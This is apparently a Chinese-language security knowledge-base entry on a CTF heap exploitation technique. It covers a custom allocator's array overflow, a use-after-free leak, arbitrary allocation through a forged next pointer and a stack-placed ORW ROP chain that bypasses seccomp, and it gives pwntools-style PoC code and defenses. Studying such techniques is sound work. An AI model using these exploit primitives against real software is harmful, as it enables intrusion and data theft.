---
id: binary-pwn-heap-custom-manager-array-overflow-next-pointer-stack-chunk-orw
title: 自定义堆管理器数组越界 + next 指针任意分配：栈上伪造 chunk 构造 ORW ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: custom-manager-array-overflow-next-pointer-stack-chunk-orw
tags:
- pwn
- heap
- custom-allocator
- array-overflow
- uaf
- arbitrary-alloc
- stack-chunk
- orw
- seccomp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:14+08:00'
  notes: 已对照原文与全部 89 张图片核对；修正 Canary 状态描述；exp 与原题偏移一致；未在目标复现
url: /docs/binary/pwn/heap/binary-pwn-heap-custom-manager-array-overflow-next-pointer-stack-chunk-orw/
draft: false
kb_aliases:
- 自定义堆管理器 pwn
- 堆块数组越界 next 指针
- 任意地址分配 chunk
- 栈上伪造 chunk
- seccomp ORW ROP
---

## 一句话结论

自定义堆管理器在创建堆块时对索引数组检查不严，允许越界写覆盖管理结构中的 next 指针；free 后不清空堆地址形成 UAF，可先泄露程序基址；再通过改写 next 指针让下一次 malloc 返回任意地址（GOT、libc、栈），最终在栈上分配 chunk 写入 ORW ROP 链，绕过 seccomp 的 execve 限制读取 flag。

## 原理

- **数组越界**：管理器用固定大小数组保存堆块指针/状态，创建堆块时只检查了部分边界或索引范围，导致可以写到数组之外，覆盖相邻管理字段（包括 next 指针）。
- **UAF 泄露**：free 后未把堆块指针清空，show 仍能读取已释放堆块内容；释放的 chunk 中残留堆地址/程序地址，可泄露 PIE 基址。
- **任意分配**：管理器按 next 指针链查找空闲块；把 next 指针改成 `target - offset` 后，下一次 malloc 会把目标地址当作 chunk 返回，从而对 GOT、libc 的 `environ`、栈地址进行读写。
- **栈上 chunk**：先通过 GOT/`environ` 泄露 libc 与栈地址，改 chunk size 让分配器接受目标栈区域，再 malloc 一个“栈上堆块”，把 ROP 链写进栈帧。
- **ORW**：目标开启 seccomp 禁止 `execve`，ROP 调用 `open("/flag")`、`read`、`write` 输出 flag；必要时用 `dup2` 把 flag 文件描述符改到 0/1 以绕过 fd 限制。

## 触发条件

- 题目/目标提供自定义堆管理器（add/free/edit/show 菜单），存在数组越界或 next 指针未校验。
- free 不清空指针，show 可读已释放块。
- 二进制启用 PIE/NX/Canary（本例 checksec 为 Full RELRO、Canary found、NX/PIE enabled；利用路径不依赖 Canary），并启用 seccomp 限制 execve。
- 可获取 libc 版本与目标文件路径（如 `/flag`）。

## 利用步骤

1. 通过越界写覆盖 chunk 0，构造 UAF 布局；free 两个块后 show，泄露 PIE 基址。
2. 改写管理器状态，使 next 指针指向 GOT 附近，申请 chunk 后 show 读取 `puts@got`，泄露 libc。
3. 用 `environ` 泄露栈地址；修改 chunk size，使 malloc 接受栈区域。
4. 在栈上申请 chunk，写入 `open/read/write` ROP 链与 `/flag` 字符串。
5. 触发函数返回，执行 ORW 输出 flag。

## PoC

核心原语（偏移/地址需按题目调整）：

```python
# 1) UAF 泄露 PIE
add(0, 0x10); add(1, 0x70); add(2, 0x70)
add(0x10, 0x10)          # 越界写覆盖 chunk 0
free(1); free(2); show(2)
elf.address = u64(io.recvuntil(b"\nSuccess", drop=True).ljust(8, b"\x00")) - 0x5220

# 2) 改 next 指针 -> GOT，申请后读 puts
buf = p64(0)*3 + p64(0x70) + p64(elf.address + 0x5200 + 0x200*8 - 0x10)
edit(0, len(buf), buf)
add(3, 0x70); add(4, 0x70); add(5, 0x70)
edit(5, 0x8, p64(elf.got["puts"]))
show(0)
libc.address = u64(io.recvuntil(b"\nSuccess", drop=True).ljust(8, b"\x00")) - libc.sym["puts"]

# 3) environ 泄露栈，改 size，栈上分配 chunk
edit(5, 0x8, p64(libc.sym["environ"]))
show(0)
stack_addr = u64(io.recvuntil(b"\nSuccess", drop=True).ljust(8, b"\x00")) + 0x120
edit(5, 0x20, p64(0)*3 + p64(elf.address + 0x5200 + 0x210*8 - 0x10))
edit(3, 0x30, p64(0x100)*6)
edit(5, 0x20, b"/flag\x00".ljust(0x10, b"\x00") + p64(0) + p64(stack_addr - 0x260))

# 4) ROP: open("/flag"), read(3, buf, n), write(1, buf, n)
```

## 变体与关联

- 数组越界可换成负数索引、整数溢出、越界 free；next 指针可换成 freelist/tcache 指针。
- 任意分配后目标可换成 `__free_hook`/`__malloc_hook`、`exit_funcs`、`_IO_FILE` 链；seccomp 下优先 ORW。
- 关联：glibc 高版本 unlink/tcache 毒化、House of 系列、VM pwn 的任意读写。

## 检测与防御

- 堆管理器对索引/长度做严格边界检查，free 后清空指针与状态（防 UAF）。
- next 指针使用相对偏移或句柄，分配前校验目标落在合法堆区域；启用 ASLR/Canary/NX。
- seccomp 仅限制 execve 不足以防止 ORW，需同时限制 open/read/write 或使用沙箱；flag 文件最小权限。
- 对堆管理器的异常分配地址做运行时检测。
